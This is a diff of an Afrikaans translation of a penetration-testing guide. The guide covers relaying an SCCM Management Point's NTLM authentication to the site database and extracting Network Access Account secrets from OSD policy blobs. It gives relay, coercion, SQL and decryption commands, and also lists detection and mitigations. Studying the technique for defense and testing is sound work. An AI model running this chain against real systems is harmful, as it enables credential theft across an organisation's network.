@@ -5,11 +5,11 @@
 ## TL;DR
 Deur 'n **System Center Configuration Manager (SCCM) Bestuurspunt (MP)** te dwing om oor SMB/RPC te autentiseer en daardie NTLM masjienrekening na die **terrein databasis (MSSQL)** te **relay**, verkry jy `smsdbrole_MP` / `smsdbrole_MPUserSvc` regte. Hierdie rolle laat jou toe om 'n stel gestoor prosedures aan te roep wat **Operating System Deployment (OSD)** beleid blobs (Netwerk Toegang Rekening geloofsbriewe, Taak-Reeks veranderlikes, ens.) blootstel. Die blobs is hex-gecodeer/enkripteer, maar kan gedecodeer en ontsleutel word met **PXEthief**, wat platte teks geheime oplewer.
 
-Hoofketting:
+Hoogvlak ketting:
 1. Ontdek MP & terrein DB ↦ ongeauthentiseerde HTTP eindpunt `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
 2. Begin `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
 3. Dwing MP met **PetitPotam**, PrinterBug, DFSCoerce, ens.
-4. Deur die SOCKS-proxy te verbind met `mssqlclient.py -windows-auth` as die gerelayde **<DOMAIN>\\<MP-host>$** rekening.
+4. Deur die SOCKS proxy te verbind met `mssqlclient.py -windows-auth` as die gerelayde **<DOMAIN>\\<MP-host>$** rekening.
 5. Voer uit:
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
@@ -25,11 +25,11 @@ Die MP ISAPI uitbreiding **GetAuth.dll** stel verskeie parameters bloot wat nie 
 
 | Parameter | Doel |
 |-----------|---------|
-| `MPKEYINFORMATIONMEDIA` | Retourneer terrein ondertekening sertifikaat publieke sleutel + GUIDs van *x86* / *x64* **Alle Onbekende Rekenings** toestelle. |
+| `MPKEYINFORMATIONMEDIA` | Retourneer terrein ondertekening sertifikaat publieke sleutel + GUIDs van *x86* / *x64* **Alle Onbekende Rekenaar** toestelle. |
 | `MPLIST` | Lys elke Bestuurspunt in die terrein. |
 | `SITESIGNCERT` | Retourneer Primêre-Terrein ondertekening sertifikaat (identifiseer die terrein bediener sonder LDAP). |
 
-Grijp die GUIDs wat as die **clientID** sal dien vir latere DB navrae:
+Grijp die GUIDs wat as die **clientID** vir latere DB navrae sal dien:
 ```bash
 curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
 ```
@@ -65,7 +65,7 @@ SELECT SMS_Unique_Identifier0
 FROM dbo.UnknownSystem_DISC
 WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```
-### 3.2  Lys toegewyde beleide
+### 3.2 Lys toegewyde beleide
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
@@ -102,12 +102,12 @@ NetworkAccessPassword: P4ssw0rd123
 ```
 ---
 
-## 5. Relevante SQL rolle & prosedures
+## 5. Betrokke SQL rolle & prosedures
 By relay word die aanmelding toegeken aan:
 * `smsdbrole_MP`
 * `smsdbrole_MPUserSvc`
 
-Hierdie rolle stel dosyne EXEC-toestemmings bloot, die sleutel wat in hierdie aanval gebruik word, is:
+Hierdie rolle stel dosyne EXEC toestemmings bloot, die sleutel een wat in hierdie aanval gebruik word is:
 
 | Gestoor Prosedure | Doel |
 |------------------|---------|
@@ -130,18 +130,20 @@ AND  pe.permission_name='EXECUTE';
 1. **Monitor MP aanmeldings** – enige MP rekenaarrekening wat aanmeld vanaf 'n IP wat nie sy gasheer is nie ≈ relay.
 2. Aktiveer **Verlengde Beskerming vir Verifikasie (EPA)** op die webwerf databasis (`PREVENT-14`).
 3. Deaktiveer ongebruikte NTLM, afdwing SMB ondertekening, beperk RPC (
-dieselfde versagtings wat teen `PetitPotam`/`PrinterBug` gebruik is).
+dieselfde versagtings wat teen `PetitPotam`/`PrinterBug` gebruik word).
 4. Versterk MP ↔ DB kommunikasie met IPSec / mutual-TLS.
 
 ---
 
 ## Sien ook
 * NTLM relay beginsels:
+
 {{#ref}}
 ../ntlm/README.md
 {{#endref}}
 
 * MSSQL misbruik & post-exploitatie:
+
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
@@ -149,7 +151,7 @@ abusing-ad-mssql.md
 
 
 ## Verwysings
-- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+- [Ek wil graag met jou bestuurder praat: Diefstal van geheime met Bestuurspunt Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
 - [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
-- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
+- [Misconfigurasie Bestuurder – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
 {{#include ../../banners/hacktricks-training.md}}
